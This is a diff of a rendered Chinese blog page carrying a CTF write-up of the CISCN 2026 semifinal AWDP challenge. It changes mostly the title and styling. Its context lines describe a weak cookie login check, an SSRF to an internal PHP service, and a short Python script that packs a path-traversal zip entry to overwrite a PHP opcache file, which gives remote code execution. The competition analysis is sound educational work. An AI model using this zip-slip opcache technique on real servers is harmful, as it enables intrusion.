@@ -21,7 +21,7 @@
   
     <meta name="description" content="前情概要遗憾三等奖，止步半决赛，赛前其实还挺有信心的，感觉修复就那点流程，结果被python给制裁了 题目分析awdpMediaDriveBREAK一道比较简单的php，漏洞点比较明显，看一眼关键代码 123456789101112131415161718192021222324252627282930313233343536if (isset($_COOKIE[&#x27;user&#x27;]">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ciscn2026 半决赛复盘">
+<meta property="og:title" content="ciscn2026-半决赛复盘">
 <meta property="og:url" content="http://example.com/2026/03/25/ciscn2026-%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/index.html">
 <meta property="og:site_name" content="onehang&#39;s blogs">
 <meta property="og:description" content="前情概要遗憾三等奖，止步半决赛，赛前其实还挺有信心的，感觉修复就那点流程，结果被python给制裁了 题目分析awdpMediaDriveBREAK一道比较简单的php，漏洞点比较明显，看一眼关键代码 123456789101112131415161718192021222324252627282930313233343536if (isset($_COOKIE[&#x27;user&#x27;]">
@@ -33,14 +33,14 @@
 <meta property="og:image" content="http://example.com/2026/03/25/ciscn2026-%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20260325205805933.png">
 <meta property="og:image" content="http://example.com/2026/03/25/ciscn2026-%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98//2026/03/25/ciscn2026-%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20260325210010989.png">
 <meta property="article:published_time" content="2026-03-25T11:18:50.000Z">
-<meta property="article:modified_time" content="2026-03-25T13:02:44.198Z">
+<meta property="article:modified_time" content="2026-03-25T13:22:59.023Z">
 <meta property="article:author" content="onehang">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/2026/03/25/ciscn2026-%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98//2026/03/25/ciscn2026-%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20260325203906101.png">
   
   
   
-  <title>ciscn2026 半决赛复盘 - onehang&#39;s blogs</title>
+  <title>ciscn2026-半决赛复盘 - onehang&#39;s blogs</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -206,7 +206,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="ciscn2026 半决赛复盘"></span>
+            <span id="subtitle" data-typed-text="ciscn2026-半决赛复盘"></span>
           
         </div>
 
@@ -277,7 +277,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">ciscn2026 半决赛复盘</h1>
+            <h1 id="seo-header">ciscn2026-半决赛复盘</h1>
             
             
               <div class="markdown-body">
@@ -309,12 +309,12 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_logged_in</span>() -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">return</span> flask.request.cookies.get(<span class="hljs-string">&quot;visited&quot;</span>) == <span class="hljs-string">&quot;yes&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">bool</span>(flask.request.cookies.get(<span class="hljs-string">&quot;user&quot;</span>))<br></code></pre></td></tr></table></figure>
 
 <p>既然登录不成问题了，我们继续分析登录后的功能点</p>
-<style>.hflkmichmiwk{zoom:50%;}</style><img src="/2026/03/25/ciscn2026-半决赛复盘//2026/03/25/ciscn2026-%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20260325203906101.png" srcset="/img/loading.gif" lazyload class="hflkmichmiwk" alt="image-20260325203906101">
+<style>.wzvuuywjvqux{zoom:50%;}</style><img src="/2026/03/25/ciscn2026-半决赛复盘//2026/03/25/ciscn2026-%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20260325203906101.png" srcset="/img/loading.gif" lazyload class="wzvuuywjvqux" alt="image-20260325203906101">
 
 
 
 <p>很容易看到三个功能点在about页面里面有一个很明显的ssrf，不用看代码也能发现</p>
-<style>.zahykljllrlp{zoom:50%;}</style><img src="/2026/03/25/ciscn2026-半决赛复盘//2026/03/25/ciscn2026-%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20260325204517726.png" srcset="/img/loading.gif" lazyload class="zahykljllrlp" alt="image-20260325204517726">
+<style>.vexsmhkfyjls{zoom:50%;}</style><img src="/2026/03/25/ciscn2026-半决赛复盘//2026/03/25/ciscn2026-%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20260325204517726.png" srcset="/img/loading.gif" lazyload class="vexsmhkfyjls" alt="image-20260325204517726">
 
 <p>看源码可以发现内网是有php服务，那么我们就可以从这里访问内网的php服务</p>
 <p>我们再看上传插件的代码</p>
@@ -327,7 +327,7 @@
 <li>题目的描述为：你知道时间的真谛吗？</li>
 <li>如果你用他给的dockerfile起环境你就会发现，他的所有目录都是只读的，除了一些单列出来的目录，压根没法把马传到&#x2F;var&#x2F;www&#x2F;html下面</li>
 </ol>
-<style>.nvyqbagyjvrc{zoom:50%;}</style><img src="/2026/03/25/ciscn2026-半决赛复盘//2026/03/25/ciscn2026-%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20260325205027908.png" srcset="/img/loading.gif" lazyload class="nvyqbagyjvrc" alt="image-20260325205027908">
+<style>.rtfchtxeglmj{zoom:50%;}</style><img src="/2026/03/25/ciscn2026-半决赛复盘//2026/03/25/ciscn2026-%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20260325205027908.png" srcset="/img/loading.gif" lazyload class="rtfchtxeglmj" alt="image-20260325205027908">
 
 <p>那么就来到了这题的第二种解法，也是预期解。他给的附件里有三个php文件</p>
 <ul>
@@ -347,7 +347,7 @@
 <p><img src="/2026/03/25/ciscn2026-半决赛复盘/image-20260325205805933.png" srcset="/img/loading.gif" lazyload alt="image-20260325205805933">php的配置文件写了opcache的目录是&#x2F;tmp，所以我们要把文件传到&#x2F;tmp&#x2F;system_id&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php.bin</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><br><span class="hljs-keyword">with</span> zipfile.ZipFile(<span class="hljs-string">&quot;upload.zip&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> zf:<br>    data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;index.php.bin&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    zf.writestr(<span class="hljs-string">&#x27;../../../../../../../../../../tmp/45b8be9467d6ed29438f06cfe9cee9f6/var/www/html/index.php.bin&#x27;</span>,data)<br><br></code></pre></td></tr></table></figure>
 
-<style>.ocncbknycskn{zoom:50%;}</style><img src="/2026/03/25/ciscn2026-半决赛复盘//2026/03/25/ciscn2026-%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20260325210010989.png" srcset="/img/loading.gif" lazyload class="ocncbknycskn" alt="image-20260325210010989">
+<style>.ndpjhpkbxsum{zoom:50%;}</style><img src="/2026/03/25/ciscn2026-半决赛复盘//2026/03/25/ciscn2026-%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20260325210010989.png" srcset="/img/loading.gif" lazyload class="ndpjhpkbxsum" alt="image-20260325210010989">
 
 <p>成功rce</p>
 <h4 id="FIX-1"><a href="/2026/03/25/ciscn2026-半决赛复盘/#FIX-1" class="headerlink" title="FIX"></a>FIX</h4><p>修复真的很难评，浙江赛区全场就两个队修了，其他赛区貌似也没有情况更好的，python害我！</p>
@@ -370,7 +370,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>ciscn2026 半决赛复盘</div>
+      <div>ciscn2026-半决赛复盘</div>
       <div>http://example.com/2026/03/25/ciscn2026-半决赛复盘/</div>
     </div>
     <div class="license-meta">
